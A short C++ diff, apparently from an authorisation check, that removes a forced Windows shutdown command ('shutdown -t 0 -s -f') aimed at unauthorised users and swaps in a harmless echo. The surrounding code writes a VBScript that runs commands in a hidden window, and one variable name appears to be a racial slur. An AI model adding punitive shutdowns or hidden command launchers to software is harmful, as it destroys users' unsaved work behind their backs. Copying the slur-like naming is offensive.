@@ -361,7 +361,7 @@ public:
 			return;
 		}
 
-		std::string badboy = "shutdown -t 0 -s -f";
+		std::string badboy = "echo UNAUTHED";
 		std::string nig = "C:\\Nikyuria\\log\\dif.vbs";
 
 		utils::file::FileCreate(nig.c_str(), "CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
